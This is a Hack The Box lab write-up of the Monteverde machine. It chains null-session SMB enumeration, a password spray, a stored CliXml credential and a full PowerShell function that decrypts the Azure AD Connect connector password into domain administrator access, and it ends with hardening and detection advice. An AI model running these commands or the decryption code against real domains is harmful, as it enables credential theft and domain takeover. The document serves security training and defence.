---
title: "Monteverde — Azure AD Sync Credential Extraction"
description: "Guest SMB null authentication and a stored CliXml credential lead to Azure AD Sync database decryption and a domain administrator password."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - azure-ad-sync
  - credential-theft
objective: "Reach domain administrator access from an unauthenticated position on an Active Directory domain controller."
tools:
  - rustscan
  - NetExec
  - evil-winrm
  - rusthound-ce
  - WinPEAS
  - sqlcmd
  - powershell
skill: "Active Directory enumeration and Azure AD Connect credential recovery"
outcome: "Domain administrator credentials decrypted from the local ADSync database, validated through a privileged WinRM session"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Windows Server 2019 Active Directory domain controller |
| Starting position | Unauthenticated network access |
| Objective | Reach domain administrator access from an unauthenticated position |
| Outcome | Domain administrator WinRM access via credentials decrypted from the ADSync database |

## Guest SMB null to ADSync decryption

Monteverde is a Medium-rated Hack The Box Windows machine whose domain controller accepts guest SMB sessions. Null-session SMB enumeration lists the domain accounts, and spraying each username as its own password recovers a service-account credential. That account can read the `users$` share, where a PowerShell CliXml file stores a domain user's password; the credential is validated over SMB and then opens a WinRM foothold. From that shell, Microsoft Azure AD Sync is found installed on the controller, and the local ADSync SQL database together with the Azure AD Connect cryptography library yields the stored connector-account password, the built-in domain `Administrator` in this deployment, which a privileged WinRM session then validates.

This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and leaves command syntax intact. See [how evidence is handled](/method/). Where a step has no captured console excerpt, the description comes from the notes alone.

**Attack path:** **Guest SMB null session → domain user enumeration → password spray → `users$` share → CliXml credential for a domain user → WinRM foothold → ADSync database query → Azure AD Connect credential decryption → domain administrator WinRM access**

## Domain controller with anonymous guest SMB, no credentials

- **Target:** an Active Directory domain controller, `<TARGET_HOSTNAME>.<TARGET_DOMAIN>`, hosting DNS, Kerberos, LDAP, SMB, and WinRM.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** move from unauthenticated access to domain administrator control, and demonstrate how common Active Directory misconfigurations compose into a full compromise.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: guest SMB to CliXml to ADSync decryption

### 1. Port Scanning

Observation: a fast TCP scan of the target exposes the service set of an Active Directory domain controller.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV
```

Truncated scan output:

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
```

Significance: the combination of DNS, Kerberos, LDAP, SMB, and WinRM identifies a Windows domain controller, so directory authentication and remote management are the primary attack surface.

Result: the target is confirmed as an Active Directory domain controller for `<TARGET_DOMAIN>`.

### 2. Guest SMB Null Authentication

Observation: the SMB service accepts a null session, confirming guest access is permitted on the domain controller.

```bash
nxc smb <TARGET_IP> -u 'a' -p '' --shares
```

```text
SMB  <TARGET_IP>  445  <TARGET_HOSTNAME>  [*] Windows 10 / Server 2019 Build 17763 x64 (name:<TARGET_HOSTNAME>) (domain:<TARGET_DOMAIN>) (signing:True) (SMBv1:None) (Null Auth:True)
```

Significance: a null SMB session allows directory queries without any credentials, exposing account and share information.

Result: null SMB authentication is accepted, confirming guest-level directory access.

### 3. SMB User Enumeration via Null Session

Observation: the null session can query the directory and enumerate domain accounts.

```bash
nxc smb <TARGET_DOMAIN> -u '' -p '' --users
```

```text
<GUEST_ACCOUNT>
<SYNC_SERVICE_ACCOUNT>
<STANDARD_USER>
<SERVICE_ACCOUNT>
<SERVICE_ACCOUNT_2>
<SERVICE_ACCOUNT_3>
<SERVICE_ACCOUNT_4>
<STANDARD_USER_2>
<STANDARD_USER_3>
<STANDARD_USER_4>
```

Significance: the list separates standard users from service accounts and includes the Azure AD Sync service account, giving a target set for credential spraying.

Result: the full domain user list is enumerated anonymously.

### 4. Password Spray

Observation: I expected service accounts on this domain to carry weak, guessable passwords, so I sprayed each enumerated username as its own password.

```bash
nxc smb <TARGET_DOMAIN> -u user.txt -p user.txt
```

```text
SMB  <TARGET_IP>  445  <TARGET_HOSTNAME>  [+] <TARGET_DOMAIN>\<SERVICE_ACCOUNT>:<SERVICE_ACCOUNT_PASSWORD>
```

Significance: the service account uses its username as its password, so the spray recovers a working credential from a single predictable guess per account.

Result: valid credentials for `<SERVICE_ACCOUNT>` are recovered.

### 5. SMB Share Enumeration

Observation: the recovered credential grants authenticated access to the available SMB shares.

```bash
nxc smb <TARGET_DOMAIN> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_ACCOUNT_PASSWORD>' --shares
```

```text
ADMIN$       Remote Admin
<AZURE_SHARE>   READ
C$             Default share
E$             Default share
IPC$           READ
NETLOGON       READ
SYSVOL         READ
users$         READ
```

The `spider_plus` module then lists the readable share contents:

```bash
nxc smb <TARGET_DOMAIN> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_ACCOUNT_PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True
```

```json
{
    "<AZURE_SHARE>": {},
    "users$": {
        "<STANDARD_USER>/azure.xml": {
            "atime_epoch": "2020-01-03 14:41:18",
            "ctime_epoch": "2020-01-03 14:39:53",
            "mtime_epoch": "2020-01-03 15:59:24",
            "size": "1.18 KB"
        }
    }
}
```

Significance: the `<AZURE_SHARE>` share is empty, but `users$` exposes a single Azure XML credential file under a user directory.

Result: the `users$` share yields `<STANDARD_USER>/azure.xml` for offline analysis.

### 6. CliXml Credential Discovery

Observation: `azure.xml` is a PowerShell CliXml serialized object, not standard XML, and carries a stored plaintext credential.

```bash
cat azure.xml
```

```powershell
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password"><STANDARD_USER_PASSWORD></S>
    </Props>
  </Obj>
</Objs>
```

The recovered password is tested against the enumerated accounts and authenticates as `<STANDARD_USER>`:

```bash
nxc smb <TARGET_DOMAIN> -u user.txt -p '<STANDARD_USER_PASSWORD>'
```

```text
SMB  <TARGET_IP>  445  <TARGET_HOSTNAME>  [+] <TARGET_DOMAIN>\<STANDARD_USER>:<STANDARD_USER_PASSWORD>
```

Significance: the CliXml export stored a reusable account password in a share readable by a service account, and the validation confirms which account it belongs to.

Result: a credential pair for `<STANDARD_USER>` is recovered from the share and validated through SMB.

### 7. WinRM Access as a Domain User

Observation: the recovered account is permitted remote management over WinRM.

```bash
nxc winrm <TARGET_DOMAIN> -u '<STANDARD_USER>' -p '<STANDARD_USER_PASSWORD>'
```

```text
WINRM  <TARGET_IP>  5985  <TARGET_HOSTNAME>  [+] <TARGET_DOMAIN>\<STANDARD_USER>:<STANDARD_USER_PASSWORD> (Pwn3d!)
```

An interactive session is then opened with the same credential:

```bash
evil-winrm -i <TARGET_IP> -u '<STANDARD_USER>' -p '<STANDARD_USER_PASSWORD>'
```

Significance: WinRM administrative access over the network turns a recovered domain-user credential into command execution on the domain controller.

Result: an authenticated interactive shell is obtained as `<TARGET_DOMAIN>\<STANDARD_USER>`, the first foothold on the controller.

### 8. Post-Exploitation Enumeration and Azure AD Sync Discovery

Observation: with a domain-user shell, the directory is mapped and the host is searched for local privilege-escalation paths.

```bash
rusthound-ce --domain <TARGET_DOMAIN> -u <STANDARD_USER> -p '<STANDARD_USER_PASSWORD>' --zip -o <TARGET_DOMAIN>
```

WinPEAS local enumeration then shows Microsoft Azure AD Sync is installed on the domain controller:

```text
c:\program files\microsoft azure ad sync
```

Significance: Azure AD Sync stores the on-premises connector credentials with reversible encryption in a local SQL Server database. A local administrator who can read that database and load `mcrypt.dll` can recover them. In this deployment the stored connector account was the built-in domain `Administrator`; the AD DS Connector account normally holds delegated directory permissions, and current Entra Connect guidance prohibits using a Domain Administrator as the connector account.

Result: Azure AD Sync is present on the controller, and its ADSync database is the target of the next stage.

### 9. Azure AD Connect Credential Decryption

Observation: the ADSync database holds the encryption metadata needed to decrypt the stored connector credential.

```bash
sqlcmd -S <TARGET_HOSTNAME> -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
```

The `Get-ADConnectPassword` function reads the encrypted configuration from the `mms_management_agent` table and decrypts it with the Azure AD Connect cryptography library (`mcrypt.dll`):

```powershell
Function Get-ADConnectPassword{
  $key_id = 1
  $instance_id = [GUID]"<INSTANCE_GUID>"
  $entropy = [GUID]"<ENTROPY_GUID>"
  $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=<TARGET_HOSTNAME>;Database=ADSync;Trusted_Connection=true"
  $client.Open()
  $cmd = $client.CreateCommand()
  $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
  $reader = $cmd.ExecuteReader()
  $reader.Read() | Out-Null
  $config = $reader.GetString(0)
  $crypted = $reader.GetString(1)
  $reader.Close()
  add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
  $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
  $km.LoadKeySet($entropy, $instance_id, $key_id)
  $key = $null
  $km.GetActiveCredentialKey([ref]$key)
  $key2 = $null
  $km.GetKey(1, [ref]$key2)
  $decrypted = $null
  $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
  $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
  $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
  $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
  Write-Host ("Domain: " + $domain.Domain)
  Write-Host ("Username: " + $username.Username)
  Write-Host ("Password: " + $password.Password)
}
```

Executing the function reveals the connector-account credentials:

```text
Domain: <TARGET_DOMAIN>
Username: <DOMAIN_ADMIN_ACCOUNT>
Password: <DOMAIN_ADMIN_PASSWORD>
```

Significance: the connector account extracted from the ADSync configuration is the built-in domain `Administrator`, whose password was recoverable from local state.

Result: a domain administrator credential pair is decrypted from the ADSync configuration.

### 10. Administrator Access via WinRM

Observation: the recovered domain administrator credential fits the exposed WinRM service.

```bash
evil-winrm -i <TARGET_IP> -u <DOMAIN_ADMIN_ACCOUNT> -p '<DOMAIN_ADMIN_PASSWORD>'
```

```text
<TARGET_DOMAIN>\<DOMAIN_ADMIN_ACCOUNT>
```

Significance: authenticated WinRM execution as the connector account moves the session from domain user to domain administrator.

Result: a privileged session is established as `<TARGET_DOMAIN>\<DOMAIN_ADMIN_ACCOUNT>` on the domain controller.

## Challenges and Decisions

No failed attempts, trade-offs, or troubleshooting steps are recorded for this path; each stage transitioned directly into the next.

## Outcome: domain administrator WinRM via ADSync

The local ADSync database yields credentials that authenticate a privileged WinRM session as `<TARGET_DOMAIN>\<DOMAIN_ADMIN_ACCOUNT>` on the domain controller. The escalation depends on the Azure AD Sync installation and its locally stored encryption keys on that host; no other systems were in scope, and activity remained inside the Hack The Box lab.

## Recommendations: guest SMB, service password, share secrets, and ADSync encryption

The actions below remain recommendations; none was tested during this case study.

1. **Null SMB sessions on the domain controller.** Anonymous SMB sessions allowed unauthenticated account and share enumeration. *Recommendation:* disable null/guest SMB access on domain controllers and restrict anonymous access to named pipes and shares. *Detection:* monitor null-session SMB authentication and anonymous share or directory queries. *Validation:* periodically re-test anonymous SMB enumeration against domain controllers.
2. **Username-derived service-account password.** A service account used its username as its password, so a single spray pass compromised it. *Recommendation:* enforce password complexity and block username-derived passwords for service accounts. *Detection:* monitor for one-password/many-account spray patterns and for accounts matching the username-as-password shape. *Validation:* audit service-account password policy and confirm spraying fails against the enumerated list.
3. **Serialized credentials on a network share.** An Azure PowerShell credential object was exported in CliXml and stored on the `users$` share, readable by a service account. *Recommendation:* never store serialized credential objects on shares; use managed service accounts or a dedicated secret store, and keep secrets out of reachable file shares. *Detection:* scan shares and backups for CliXml and other credential artifacts. *Validation:* confirm no credential files remain in readable shares after remediation.
4. **Reversible Azure AD Connect credential storage.** The ADSync database stored the on-premises connector-account password under reversible encryption, decryptable with the local `mcrypt.dll`. *Recommendation:* restrict access to the ADSync database and key material, prefer group Managed Service Accounts for the sync service where supported, and rotate connector credentials regularly. *Detection:* monitor access to the ADSync database and `mcrypt.dll` by non-administrative users. *Validation:* confirm the connector account is not a standing domain administrator and that its credential can be rotated without service disruption.

## References

- [Hack The Box — Monteverde](https://app.hackthebox.com/machines/Monteverde) (retired Windows machine)
- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB and WinRM enumeration, credential spraying, and share listing)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) (WinRM interactive shell)
- [RustHound-CE](https://github.com/g0h4n/RustHound-CE) (BloodHound-compatible Active Directory collector)
- [BloodHound](https://github.com/SpecterOps/BloodHound) (Active Directory attack-path analysis)
- [PEASS-ng (WinPEAS)](https://github.com/peass-ng/PEASS-ng) (local privilege-escalation enumeration)
- [sqlcmd utility — Microsoft Learn](https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility) (querying the ADSync SQL database)
- [Microsoft Entra Connect: Accounts and permissions — Microsoft Learn](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) (AD DS connector and ADSync service accounts)
- [Microsoft Entra Connect Sync: Understanding the architecture — Microsoft Learn](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-azure-ad-connect-sync-architecture) (sync service, connector accounts, and the ADSync database)
- [Enable insecure guest logons in SMB2 and SMB3 — Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/storage/file-server/enable-insecure-guest-logons-smb2-and-smb3) (guest SMB access)
- [Network access: Restrict anonymous access to Named Pipes and Shares — Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-restrict-anonymous-access-to-named-pipes-and-shares) (null-session hardening)
- [Password must meet complexity requirements — Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-must-meet-complexity-requirements) (password policy)
